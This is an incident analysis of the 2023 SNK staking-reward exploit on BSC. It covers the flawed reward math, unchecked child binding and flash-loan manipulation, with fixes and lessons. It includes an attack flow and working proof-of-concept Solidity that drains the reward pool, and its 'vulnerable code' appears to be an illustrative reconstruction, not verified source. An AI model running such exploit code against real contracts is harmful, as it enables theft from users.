# SNK — Reward Calculation Error Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2023-05-10 |
| **Protocol** | SNK (SNK Token / SNKMinter) |
| **Chain** | BSC (BNB Chain) |
| **Loss** | ~$197,000 (SNK tokens) |
| **Attacker** | [0xace11292...](https://bscscan.com/address/0xace112925935335d0d7460a2470a612494f910467e263c7ff477221deee90a2c) |
| **Attack Contract** | Temporary contract deployed within the attack transaction |
| **Attack Tx 1** | [0xace11292...](https://bscscan.com/tx/0xace112925935335d0d7460a2470a612494f910467e263c7ff477221deee90a2c) |
| **Attack Tx 2** | [0x7394f252...](https://bscscan.com/tx/0x7394f2520ff4e913321dd78f67dd84483e396eb7a25cbb02e06fe875fc47013a) |
| **Vulnerable Contract** | [SNKMinter 0xA3f5ea94...](https://bscscan.com/address/0xA3f5ea945c4970f48E322f1e70F4CC08e70039ee) |
| **SNK Token** | [0x05e28991...](https://bscscan.com/address/0x05e2899179003d7c328de3C224e9dF2827406509) |
| **PancakeSwap LP** | [0x79570967...](https://bscscan.com/address/0x7957096Bd7324357172B765C4b0996Bb164ebfd4) |
| **Root Cause** | Child account balance summation error in `rewardPerToken()` calculation — the reward owed to a parent account is multiplied by the sum of all child account balances, resulting in over-payment |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-05/SNK_exp.sol) |

---

## 1. Vulnerability Overview

The SNK protocol is a staking and referral reward system operating on the BSC chain. Users can stake SNK tokens in the `SNKMinter` contract and earn additional rewards through a parent-child referral relationship structure.

### Core Vulnerability

A critical flaw exists in the reward calculation logic of the `SNKMinter` contract. When computing `rewardPerToken()` for a parent account, the implementation **uses the sum of child account balances as a multiplicand**. As a result, if an attacker stakes a large amount of SNK tokens borrowed via flash loan into newly created child contracts and binds them to an existing parent, the parent's reward is amplified by several to hundreds of times proportional to the new child balances.

### Attack Preconditions

1. 10 parent contracts must already be staking 100 SNK each
2. Obtain 80,000 SNK via flash loan
3. Deploy a new child contract for each parent and stake a large amount of SNK
4. Child balances are reflected in reward calculations, causing an explosive increase in parent rewards
5. Call `exit()` on both parent and child to withdraw principal + inflated rewards
6. Repay the flash loan and retain the profit

---

## 2. Vulnerable Code Analysis

### 2.1 rewardPerToken Balance Summation Error (Core Vulnerability)

```solidity
// ❌ Vulnerable code — error of multiplying by child balance sum when calculating parent reward
function earned(address parent) public view returns (uint256) {
    // rewardPerToken() reflects the sum of all children's balances
    // rather than the parent's own balance
    uint256 reward = rewardPerToken(parent) * getAllChildrenBalance(parent);
    //                               ^^^^^^^   ^^^^^^^^^^^^^^^^^^^^^^^
    // ❌ Problem: rewardPerToken should be based on the parent's individual contribution,
    //    but the sum of children's balances enters the multiplication, distorting the reward rate
    return reward;
}

function rewardPerToken(address account) internal view returns (uint256) {
    // ❌ The sum of child account balances is included in the reward rate calculation
    uint256 childrenTotalBalance = 0;
    for (uint256 i = 0; i < children[account].length; i++) {
        childrenTotalBalance += balanceOf[children[account][i]];
        // ❌ Adding a new child or increasing its balance also amplifies the parent's reward
    }
    return accumulatedRewardPerToken * childrenTotalBalance / PRECISION;
}
```

```solidity
// ✅ Fixed code — reward calculation uses only the account's own staking balance
function earned(address account) public view returns (uint256) {
    // Reward is calculated proportionally to the account's own staking balance only
    return (balanceOf[account] * (rewardPerTokenStored - userRewardPerTokenPaid[account])) / PRECISION
           + rewards[account];
    // ✅ Another account's (child's) balance does not affect this account's reward
}

function rewardPerToken() public view returns (uint256) {
    // ✅ Unit reward calculated based on total staking supply
    if (totalSupply == 0) return rewardPerTokenStored;
    return rewardPerTokenStored + (rewardRate * (block.timestamp - lastUpdateTime) * PRECISION) / totalSupply;
}
```

**Issue**: In the parent-child referral structure, the reward for the parent is computed by directly multiplying by the sum of children's staking balances. If an attacker stakes a large amount of SNK into a new child contract via flash loan and binds it to an existing parent, the parent's reward increases explosively in proportion to the new child balance.

### 2.2 Lack of Input Validation for Child Binding

```solidity
// ❌ Vulnerable code — anyone can bind as a child to an arbitrary parent
function bindParent(address parent) external {
    require(parentOf[msg.sender] == address(0), "already bound");
    parentOf[msg.sender] = parent;
    children[parent].push(msg.sender);
    // ❌ Binding is possible unilaterally without parent consent
    // ❌ Reflected in reward calculation immediately upon binding (no delay/lock)
}
```

```solidity
// ✅ Fixed code — requires parent pre-approval or delayed binding effect
function requestBindParent(address parent) external {
    require(parentOf[msg.sender] == address(0), "already bound");
    pendingParent[msg.sender] = parent;
    // ✅ Binding is only completed after the parent explicitly accepts
}

function acceptChild(address child) external {
    require(pendingParent[child] == msg.sender, "no pending request");
    parentOf[child] = msg.sender;
    children[msg.sender].push(child);
    // ✅ Reflected in reward calculation only at the time of binding acceptance
}
```

**Issue**: A child could bind unilaterally to a parent without consent, allowing an attacker to freely attach malicious child contracts to existing legitimate users (parents).

---

## 3. Attack Flow

### 3.1 Preparation Phase

Pre-attack setup (setUp):
- Obtain 1,000 SNK and deploy 10 `HackerTemplate` parent contracts
- Transfer 100 SNK to each parent contract and call `SNKMinter.stake()`
- `vm.warp(+20 days)`: simulate 20 days elapsed to accumulate rewards

### 3.2 Execution Phase

```
Step 1: Flash Loan Request
  Attacker → PancakeSwap LP → Flash loan of 80,000 SNK

Step 2: Loop inside pancakeCall callback (10 iterations)
  Each iteration i:
    a. Deploy new HackerTemplate (child) contract
    b. child.bind(parents[i])  →  child binds to parent
    c. Transfer all SNK tokens → to child
    d. child.stake()  →  stake full amount (immediately reflected in reward calculation)
    e. parents[i].exit2()  →  parent: execute getReward() + exit()
                              (collect rewards amplified by child balance)
    f. child.exit1()  →  child: execute exit() (recover principal)
    g. Attacker retrieves all SNK

Step 3: Repay Flash Loan
  Return 85,000 SNK to PancakeSwap LP (principal 80,000 + fee 5,000)

Step 4: Swap Profit
  Remaining SNK → PancakeSwap → swap to BUSD → profit realized
```

### 3.3 Attack Flow Diagram

```
┌─────────────────────────────────────────────────┐
│  Attacker (SNKExp Contract)                      │
│  calls testExp()                                │
└───────────────────┬─────────────────────────────┘
                    │ pool.swap(80,000 SNK)
                    ▼
┌─────────────────────────────────────────────────┐
│  PancakeSwap LP Pool                            │
│  0x7957096Bd7324357172B765C4b0996Bb164ebfd4     │
│  → Flash loan of 80,000 SNK                     │
└───────────────────┬─────────────────────────────┘
                    │ pancakeCall callback
                    ▼
┌─────────────────────────────────────────────────┐
│  pancakeCall() callback — loop 10 times          │
│                                                 │
│  ┌──────────────────────────────────────────┐   │
│  │ [Iteration i = 0..9]                      │   │
│  │                                          │   │
│  │  new HackerTemplate() → child contract   │   │
│  │         │                                │   │
│  │         │ bindParent(parents[i])         │   │
│  │         ▼                                │   │
│  │  SNKMinter.bindParent()                  │   │
│  │  children[parents[i]].push(child)        │   │
│  │         │                                │   │
│  │         │ transfer 80,000 SNK → stake()  │   │
│  │         ▼                                │   │
│  │  SNKMinter.stake(80,000 SNK)             │   │
│  │  ← parent reward explodes via child bal  │   │
│  │         │                                │   │
│  │         │ parents[i].exit2()             │   │
│  │         ▼                                │   │
│  │  SNKMinter.getReward() ← amplified reward│   │
│  │  SNKMinter.exit()      ← recover principal  │
│  │         │                                │   │
│  │         │ child.exit1()                  │   │
│  │         ▼                                │   │
│  │  SNKMinter.exit()  ← child principal recovery│
│  └──────────────────────────────────────────┘   │
│                                                 │
│  → Return 85,000 SNK to LP (repay flash loan)   │
└───────────────────┬─────────────────────────────┘
                    │ retain remaining SNK
                    ▼
┌─────────────────────────────────────────────────┐
│  PancakeSwap Router                             │
│  Swap SNK → BUSD                                │
│  → Attacker profit realized (~$197,000)          │
└─────────────────────────────────────────────────┘
```

### 3.4 Outcome

- **Attacker Profit**: ~$197,000 worth of BUSD
- **Protocol Loss**: SNK reward pool drained (~$197,000)
- **Flash Loan Cost**: 5,000 SNK (fee)

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// [Phase 1] Flash loan trigger
function testExp() external {
    // Request flash loan of 80,000 SNK from PancakeSwap LP
    // Pass "0x123" data to trigger pancakeCall callback
    pool.swap(80_000 ether, 0, address(this), bytes("0x123"));

    // [Phase 4] Swap remaining SNK to BUSD to realize profit
    address[] memory path = new address[](2);
    path[0] = address(SNKToken);
    path[1] = (address(BUSD));
    router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        SNKToken.balanceOf(address(this)), 0, path, address(this), block.timestamp + 1000
    );
}

// [Phase 2] Flash loan callback — core attack logic
function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
    // Iterate over each of the 10 existing parent accounts
    for (uint256 i = 0; i < 10; ++i) {
        // [2-a] Deploy new child contract
        HackerTemplate t1 = new HackerTemplate();
        HackerTemplate t = HackerTemplate(parents[i]);

        // [2-b] Bind child to existing parent
        //       → calls SNKMinter.bindParent(parents[i])
        //       → t1 is added to children[parents[i]]
        t1.bind(parents[i]);

        // [2-c] Transfer all held SNK (~80,000) to child
        SNKToken.transfer(address(t1), SNKToken.balanceOf(address(this)));

        // [2-d] Child stakes full amount
        //       → parent's rewardPerToken explodes
        //         based on child balance (80,000 SNK) during reward calculation
        t1.stake();

        // [2-e] Parent contract: collect amplified reward + recover principal
        //       getReward() → receive abnormally large reward
        //       exit()      → recover principal (100 SNK)
        t.exit2();

        // [2-f] Child contract: recover principal
        //       exit() → recover full 80,000 SNK and return to attacker
        t1.exit1();
    }

    // [Phase 3] Repay flash loan (principal 80,000 + fee 5,000 = 85,000 SNK)
    SNKToken.transfer(address(pool), 85_000 ether);
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Child balance summation error in reward calculation (rewardPerToken logic flaw) | CRITICAL | CWE-682 (Incorrect Calculation) |
| V-02 | Unilateral child binding without parent consent | HIGH | CWE-284 (Improper Access Control) |
| V-03 | Temporary balance manipulation via flash loan | HIGH | CWE-841 (Improper Enforcement of Behavioral Workflow) |

### V-01: rewardPerToken Balance Summation Error

- **Description**: The `SNKMinter.rewardPerToken()` or `earned()` function uses the sum of all registered child account balances — rather than the parent's own staking balance — as the multiplicand when computing the parent account's reward. As a result, adding a new child or rapidly increasing a child's balance causes the parent's reward to amplify abnormally in proportion.
- **Impact**: Full drainage of the protocol reward pool. Confiscation of legitimate user rewards. Decline in SNK token value.
- **Attack Conditions**: (1) Obtain large amounts of SNK via flash loan, (2) Existing parent accounts present, (3) Atomic execution within flash loan callback in the order: create child → bind → stake → claim reward → unstake

### V-02: Child Binding Without Parent Consent

- **Description**: The `bindParent(address parent)` function allows the caller to designate any arbitrary address as a parent. No approval or verification from the parent side is required.
- **Impact**: An attacker can designate any legitimate user as a parent and have their own balance reflected in that parent's reward calculation.
- **Attack Conditions**: Any address can bind simply by calling `bindParent()`. Attack is possible with only gas fees.

### V-03: Temporary Balance Manipulation via Flash Loan

- **Description**: Reward calculation is based on real-time balances rather than snapshots, so a large balance temporarily obtained via flash loan is directly reflected in the reward calculation.
- **Impact**: By holding an enormous balance briefly within a single transaction, rewards can be amplified hundreds of times and withdrawn.
- **Attack Conditions**: Access to a flash loan provider (PancakeSwap LP), atomic execution within the same transaction.

---

## 6. Remediation Recommendations

### Immediate Actions

**Fix reward calculation logic — use only the account's own balance**:

```solidity
// ✅ Fixed earned() — calculated based solely on the account's own balance
function earned(address account) public view returns (uint256) {
    return (
        balanceOf[account]
            * (rewardPerToken() - userRewardPerTokenPaid[account])
            / PRECISION
    ) + rewards[account];
    // ✅ Uses only account's own balanceOf
    // ✅ Child account balances do not participate in this calculation
}

function rewardPerToken() public view returns (uint256) {
    // ✅ Unit reward calculated based on total staking supply (totalSupply)
    if (totalSupply == 0) return rewardPerTokenStored;
    return rewardPerTokenStored
        + (rewardRate * (block.timestamp - lastUpdateTime) * PRECISION)
          / totalSupply;
}
```

**Introduce timelock or parent approval for child binding**:

```solidity
// ✅ Parent-approval-based child binding
mapping(address => address) public pendingParentRequest;

function requestBindParent(address parent) external {
    require(parentOf[msg.sender] == address(0), "already bound");
    pendingParentRequest[msg.sender] = parent;
    // ✅ No immediate binding effect — awaiting parent approval
}

function approveChild(address child) external {
    require(pendingParentRequest[child] == msg.sender, "no approval request");
    parentOf[child] = msg.sender;
    children[msg.sender].push(child);
    delete pendingParentRequest[child];
    // ✅ Only children explicitly approved by the parent are bound
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: Reward calculation error | Adopt standard Synthetix reward pattern — `earned = balance * (rewardPerToken - paid) / PRECISION` |
| V-02: Unauthorized binding | Introduce 2-step binding requiring parent consent or on-chain signature verification |
| V-03: Flash loan manipulation | Implement snapshot (checkpoint)-based reward calculation + minimum staking lock period |
| Overall reward math | Introduce formal verification or invariant testing |
| Emergency response | Introduce automatic circuit breaker that pauses on reward pool depletion detection |

---

## 7. Lessons Learned

1. **Reward calculation must use only the account's own balance**: Any structure where another party's (child's, partner's, etc.) balance can influence your own reward calculation inherently contains manipulation risk. Adopt `balance * (rewardPerToken - paid) / PRECISION` as the standard formula, following Synthetix's `StakingRewards` pattern.

2. **Design rewards to be immune to flash loan manipulation**: The balance used as the reward calculation basis should use block-number-based snapshots or Time-Weighted Average Balance (TWAB). Relying solely on real-time balances allows flash loans to inflate instantaneous balances and drain rewards.

3. **Referral/social structures expand the attack surface**: In structures with economic linkage between accounts — such as parent-child relationships — the influence of external accounts on your own reward must be rigorously blocked. Assume that all inputs to economic computations can be controlled by an attacker.

4. **Compound operations within flash loan callbacks are always dangerous**: If stake → getReward → exit are all possible within a single transaction, the protocol is exposed to flash loan attacks. Introduce a timelock requiring at least 1 block or a set period to elapse after staking before rewards can be claimed.

5. **Mandate PoC-based invariant testing**: As seen in the comparison between `testNormal()` and `testExp()`, the profit discrepancy between the normal path and the attack path can be detected through automated invariant testing. Include the invariant `reward_claimed <= staking_duration * reward_rate * my_balance_ratio` in fuzz test suites.

6. **Validate reward math formulas before external audits**: Reward calculation logic cannot be sufficiently verified by unit tests alone — mathematical formal verification or a dedicated math audit is required. This is especially true for reward calculations in complex referral tree structures.

---

## 8. On-Chain Verification

> On-chain verification: Direct queries were not performed as the `cast` (Foundry) tool is not installed in this environment. The data below is reference information based on PoC code analysis.

### 8.1 Key Figures from PoC

| Item | PoC-Based Estimate | Notes |
|------|----------------|------|
| Flash loan size | 80,000 SNK | `pool.swap(80_000 ether, ...)` |
| Flash loan repayment | 85,000 SNK | `SNKToken.transfer(address(pool), 85_000 ether)` |
| Fee cost | 5,000 SNK | Repayment - Borrowed amount |
| Attack block | 27,784,455 | `cheats.createSelectFork("bsc", 27_784_455)` |
| Reward accrual period | 20 days | `vm.warp(startTime + 20 days)` |
| Number of parent accounts | 10 | setUp loop |
| Staking per parent | 100 SNK | |
| Total legitimate staking | 1,000 SNK | 10 × 100 SNK |
| Total loss | ~$197,000 | Per DeFiHackLabs README |

### 8.2 Reference Transactions

| Type | Hash | Link |
|------|------|------|
| Attack Tx 1 | 0xace11292...deee90a2c | [BscScan](https://bscscan.com/tx/0xace112925935335d0d7460a2470a612494f910467e263c7ff477221deee90a2c) |
| Attack Tx 2 | 0x7394f252...fc47013a | [BscScan](https://bscscan.com/tx/0x7394f2520ff4e913321dd78f67dd84483e396eb7a25cbb02e06fe875fc47013a) |
| Phalcon Analysis | 0xace11292... | [Phalcon Explorer](https://explorer.phalcon.xyz/tx/bsc/0xace112925935335d0d7460a2470a612494f910467e263c7ff477221deee90a2c) |

### 8.3 Related Pattern Matching

This incident maps to the following pattern files:

- **`17_staking_reward.md`** — Reward calculation error (core)
- **`02_flash_loan.md`** — Temporary balance manipulation via flash loan
- **`11_logic_error.md`** — Referral tree logic flaw
- **`03_access_control.md`** — Child binding without parent consent (missing access control)

---

*References: [Phalcon Analysis Tweet](https://twitter.com/Phalcon_xyz/status/1656176776425644032) | [DeFiHackLabs PoC](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-05/SNK_exp.sol)*